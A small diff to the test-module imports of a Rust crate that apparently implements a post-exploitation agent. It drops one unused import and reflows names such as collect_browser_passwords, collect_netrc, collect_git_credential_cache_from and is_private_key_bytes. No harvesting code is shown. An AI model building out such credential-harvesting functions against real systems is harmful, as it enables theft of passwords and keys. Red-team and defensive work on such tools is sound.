@@ -5068,9 +5068,9 @@ mod tests {
         DownloadTransferState, GroupEntry, HarvestEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED,
         MEM_PRIVATE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback,
         PhantomState, SessionEntry, UserEntry, collect_browser_passwords,
-        collect_git_credential_cache, collect_git_credential_cache_from, collect_netrc,
-        encode_harvest_entries, execute, is_private_key_bytes, parse_group_entries,
-        parse_logged_on_sessions, parse_logged_on_users, parse_memory_region, parse_user_entries,
+        collect_git_credential_cache_from, collect_netrc, encode_harvest_entries, execute,
+        is_private_key_bytes, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
+        parse_memory_region, parse_user_entries,
     };
     use crate::config::PhantomConfig;
 
